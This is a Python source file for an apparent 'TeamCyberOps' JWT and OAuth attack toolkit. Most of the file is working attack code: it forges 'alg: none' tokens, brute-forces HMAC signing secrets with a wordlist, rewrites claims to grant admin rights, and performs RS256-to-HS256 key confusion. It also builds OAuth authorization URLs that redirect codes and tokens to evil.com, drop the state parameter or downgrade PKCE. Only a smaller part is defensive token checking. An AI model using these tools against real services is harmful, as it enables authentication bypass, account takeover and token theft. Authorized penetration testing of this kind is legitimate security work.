"""
TeamCyberOps Suite v4 — JWT / OAuth / Auth Flow Analyzer
Full JWT attack suite + OAuth flow testing
Pure Python — no external dependencies
"""
import json, re, base64, hmac, hashlib, struct, time, urllib.request, urllib.parse
from pathlib import Path

# ══════════════════════════════════════════════════════════════
#  JWT DECODER & ANALYZER
# ══════════════════════════════════════════════════════════════

def _b64_decode(s: str) -> bytes:
    """URL-safe base64 decode with padding."""
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4: s += '=' * pad
    return base64.b64decode(s)


def decode_jwt(token: str) -> dict:
    """Decode a JWT without verification."""
    token = token.strip()
    parts = token.split('.')
    if len(parts) != 3:
        return {"error": "Invalid JWT format (need 3 parts)"}
    try:
        header    = json.loads(_b64_decode(parts[0]))
        payload   = json.loads(_b64_decode(parts[1]))
        signature = parts[2]
        return {
            "header":    header,
            "payload":   payload,
            "signature": signature,
            "parts":     parts,
            "algorithm": header.get("alg", "unknown"),
            "type":      header.get("typ", "unknown"),
        }
    except Exception as e:
        return {"error": str(e)}


def _hs_sign(header_b64: str, payload_b64: str, secret: bytes) -> str:
    """Sign JWT with HMAC-SHA256."""
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).rstrip(b'=').decode()


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def attack_alg_none(token: str) -> dict:
    """JWT algorithm confusion: set alg to none, remove signature."""
    decoded = decode_jwt(token)
    if "error" in decoded: return decoded
    parts   = decoded["parts"]
    results = []
    # Try different none variations
    for alg_val in ["none", "None", "NONE", "nOnE"]:
        new_header  = {**decoded["header"], "alg": alg_val}
        h_b64       = _b64url(json.dumps(new_header, separators=(',',':')).encode())
        p_b64       = parts[1]
        forged      = f"{h_b64}.{p_b64}."
        results.append({"alg": alg_val, "token": forged})
    return {"attack": "alg_none", "tokens": results,
            "original_alg": decoded["algorithm"],
            "usage": "Replace Authorization header with forged token"}


def attack_weak_secret(token: str, wordlist: list = None) -> dict:
    """Brute-force JWT HMAC secret."""
    decoded = decode_jwt(token)
    if "error" in decoded: return decoded
    if decoded["algorithm"] not in ("HS256", "HS384", "HS512"):
        return {"error": f"Not an HMAC algorithm: {decoded['algorithm']}"}
    parts = decoded["parts"]
    if wordlist is None:
        wordlist = [
            "secret", "password", "123456", "admin", "key", "jwt",
            "secret123", "mysecret", "jwtkey", "jwtsecret",
            "SuperSecretKey", "YourJWTSecretKey", "defaultsecret",
            "dev_secret", "prod_secret", "private_key", "change_me",
            "ChangeThisToALongRandomSecret", "your-256-bit-secret",
            "your-secret", "my-secret", "super-secret", "ultra-secret",
            "", "null", "undefined", "test", "demo", "example",
            "1234567890", "qwerty", "letmein", "welcome", "monkey",
            "dragon", "master", "hello", "sunshine", "princess",
        ]
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                "HS512": hashlib.sha512}
    h_func   = hash_map.get(decoded["algorithm"], hashlib.sha256)
    msg      = f"{parts[0]}.{parts[1]}".encode()
    expected = _b64_decode(parts[2] + "==") if parts[2] else b""
    for secret in wordlist:
        try:
            sig = hmac.new(secret.encode(), msg, h_func).digest()
            if sig == expected:
                return {"found": True, "secret": secret,
                        "algorithm": decoded["algorithm"]}
        except Exception:
            pass
    return {"found": False, "tested": len(wordlist),
            "message": "Secret not in wordlist — try rockyou.txt"}


def forge_payload(token: str, new_claims: dict, secret: str = "") -> dict:
    """Forge JWT with new payload claims."""
    decoded = decode_jwt(token)
    if "error" in decoded: return decoded
    parts       = decoded["parts"]
    new_payload = {**decoded["payload"], **new_claims}
    h_b64 = parts[0]
    p_b64 = _b64url(json.dumps(new_payload, separators=(',',':')).encode())
    if secret:
        sig   = _hs_sign(h_b64, p_b64, secret.encode())
        token = f"{h_b64}.{p_b64}.{sig}"
    else:
        token = f"{h_b64}.{p_b64}."
    return {"token": token, "payload": new_payload,
            "signed": bool(secret)}


def attack_rs256_hs256(token: str, public_key_pem: str) -> dict:
    """RS256 → HS256 algorithm confusion attack.
    Sign HS256 token using RS256 public key as HMAC secret.
    """
    decoded = decode_jwt(token)
    if "error" in decoded: return decoded
    # Build HS256 header
    new_header = {**decoded["header"], "alg": "HS256"}
    h_b64      = _b64url(json.dumps(new_header, separators=(',',':')).encode())
    p_b64      = decoded["parts"][1]
    # Sign using public key bytes as HMAC secret
    pem_bytes  = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
    sig        = _hs_sign(h_b64, p_b64, pem_bytes)
    return {"token": f"{h_b64}.{p_b64}.{sig}",
            "attack": "RS256_to_HS256",
            "note": "Use RS256 public key as HS256 HMAC secret"}


def analyze_jwt_security(token: str) -> dict:
    """Full security analysis of a JWT."""
    decoded = decode_jwt(token)
    if "error" in decoded: return decoded
    issues    = []
    payload   = decoded["payload"]
    algorithm = decoded["algorithm"]

    # Algorithm checks
    if algorithm.lower() == "none":
        issues.append({"severity": "CRITICAL", "issue": "alg=none — no signature verification!"})
    elif algorithm in ("RS256", "RS384", "RS512"):
        issues.append({"severity": "HIGH",
                       "issue": "RSA algorithm — test RS256→HS256 confusion",
                       "test": "Get public key from /.well-known/jwks.json"})
    elif algorithm in ("HS256", "HS384", "HS512"):
        issues.append({"severity": "MEDIUM", "issue": "HMAC — brute-force secret possible"})

    # Payload checks
    now = time.time()
    if "exp" not in payload:
        issues.append({"severity": "HIGH", "issue": "No expiry (exp) — token never expires"})
    elif payload.get("exp", 0) < now:
        issues.append({"severity": "INFO", "issue": f"Token expired: {payload['exp']}"})

    if "iat" not in payload:
        issues.append({"severity": "LOW", "issue": "No issued-at (iat) claim"})

    if "nbf" in payload and payload["nbf"] > now:
        issues.append({"severity": "INFO", "issue": "Token not yet valid (nbf in future)"})

    # Privilege claims
    for key in ("role", "admin", "is_admin", "isAdmin", "privilege",
                "group", "permission", "scope", "user_type"):
        if key in payload:
            val = payload[key]
            issues.append({"severity": "INFO",
                           "issue": f"Privilege claim: {key}={val}",
                           "test": f"Try setting {key}='admin' or {key}=true"})

    # Sensitive data
    sensitive = ("password", "secret", "key", "token", "ssn", "credit", "card")
    for k, v in payload.items():
        if any(s in k.lower() for s in sensitive):
            issues.append({"severity": "HIGH",
                           "issue": f"Sensitive data in payload: {k}"})

    return {"decoded": decoded, "issues": issues,
            "attacks_to_try": ["alg_none", "weak_secret", "rs256_hs256",
                               "kid_injection", "jwks_spoofing"]}


# ══════════════════════════════════════════════════════════════
#  OAUTH FLOW ANALYZER
# ══════════════════════════════════════════════════════════════

def analyze_oauth_url(url: str) -> dict:
    """Parse and analyze an OAuth authorization URL."""
    try:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
    except Exception as e:
        return {"error": str(e)}

    issues = []
    # Required params
    if "response_type" not in params:
        issues.append({"severity": "INFO", "issue": "Missing response_type"})
    if "client_id" not in params:
        issues.append({"severity": "INFO", "issue": "Missing client_id"})

    # State check (CSRF protection)
    if "state" not in params or not params.get("state"):
        issues.append({"severity": "HIGH",
                       "issue": "Missing state parameter — CSRF possible",
                       "test": "Omit state, click authorize, check if still works"})

    # Redirect URI
    redirect_uri = params.get("redirect_uri", "")
    if redirect_uri:
        issues.append({"severity": "INFO",
                       "issue": f"redirect_uri: {redirect_uri}",
                       "tests": [
                           f"Try: {redirect_uri}@evil.com",
                           f"Try: {redirect_uri}.evil.com",
                           f"Try: evil.com/{redirect_uri}",
                           "Replace with open redirect on same domain",
                       ]})

    # Response type
    rt = params.get("response_type", "")
    if rt == "token":
        issues.append({"severity": "HIGH",
                       "issue": "Implicit flow (token in URL) — token leaks via Referer/logs"})

    # PKCE
    if "code_challenge" not in params:
        issues.append({"severity": "MEDIUM",
                       "issue": "No PKCE — authorization code interception possible"})

    return {
        "params":   params,
        "endpoint": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
        "issues":   issues,
        "attacks":  [
            "state_bypass", "redirect_uri_manipulation",
            "token_leakage", "pkce_downgrade",
        ]
    }


def generate_oauth_attacks(auth_url: str, redirect_uri: str = "") -> dict:
    """Generate OAuth attack URLs."""
    parsed = urllib.parse.urlparse(auth_url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    ru     = redirect_uri or params.get("redirect_uri", "https://evil.com")

    def rebuild(**overrides):
        p = {**params, **overrides}
        return base + "?" + urllib.parse.urlencode(p)

    attacks = {
        "csrf_no_state":       rebuild(**{"state": ""}),
        "redirect_open":       rebuild(**{"redirect_uri": "https://evil.com"}),
        "redirect_append":     rebuild(**{"redirect_uri": ru + ".evil.com"}),
        "redirect_at":         rebuild(**{"redirect_uri": ru + "@evil.com"}),
        "redirect_slash":      rebuild(**{"redirect_uri": "https://evil.com/" + ru}),
        "implicit_flow":       rebuild(**{"response_type": "token"}),
        "code_and_token":      rebuild(**{"response_type": "code token"}),
        "scope_upgrade":       rebuild(**{"scope": "admin openid profile email"}),
        "pkce_downgrade":      rebuild(**{"code_challenge_method": "plain"}),
    }
    return {"attacks": attacks, "base_url": base,
            "original_params": params}


def fetch_jwks(domain: str) -> dict:
    """Fetch JWKS from well-known endpoint."""
    urls_to_try = [
        f"https://{domain}/.well-known/jwks.json",
        f"https://{domain}/.well-known/openid-configuration",
        f"https://{domain}/oauth/discovery/keys",
        f"https://{domain}/auth/keys",
        f"https://{domain}/.well-known/keys",
    ]
    for url in urls_to_try:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as r:
                data = json.loads(r.read())
                return {"url": url, "data": data, "found": True}
        except Exception:
            pass
    return {"found": False, "tried": urls_to_try}


# ══════════════════════════════════════════════════════════════
#  SESSION SECURITY ANALYZER
# ══════════════════════════════════════════════════════════════

def analyze_session_token(token: str) -> dict:
    """Analyze a session token for weaknesses."""
    issues = []
    # Length check
    if len(token) < 16:
        issues.append({"severity": "CRITICAL",
                       "issue": f"Token too short: {len(token)} chars"})
    elif len(token) < 32:
        issues.append({"severity": "HIGH",
                       "issue": f"Token short: {len(token)} chars (recommend 32+)"})

    # Entropy check
    unique_chars = len(set(token))
    if unique_chars < 10:
        issues.append({"severity": "HIGH",
                       "issue": f"Low entropy: only {unique_chars} unique chars"})

    # Pattern detection
    if re.match(r'^\d+$', token):
        issues.append({"severity": "CRITICAL",
                       "issue": "Numeric-only token — predictable!"})
    if re.match(r'^[0-9a-f]+$', token.lower()) and len(token) in (8, 16, 32):
        issues.append({"severity": "MEDIUM",
                       "issue": "Looks like hex hash — may be MD5/SHA of predictable data"})

    # Base64 check (may contain structured data)
    try:
        decoded_b64 = base64.b64decode(token + "==").decode("utf-8", errors="ignore")
        if "{" in decoded_b64 or ":" in decoded_b64:
            issues.append({"severity": "HIGH",
                           "issue": f"Base64-decoded contains structured data: {decoded_b64[:80]}"})
    except Exception:
        pass

    # JWT check
    if token.count('.') == 2 and token.startswith('eyJ'):
        jwt_analysis = analyze_jwt_security(token)
        issues.extend(jwt_analysis.get("issues", []))

    return {"token": token[:20] + "..." if len(token) > 20 else token,
            "length": len(token),
            "unique_chars": unique_chars,
            "issues": issues}
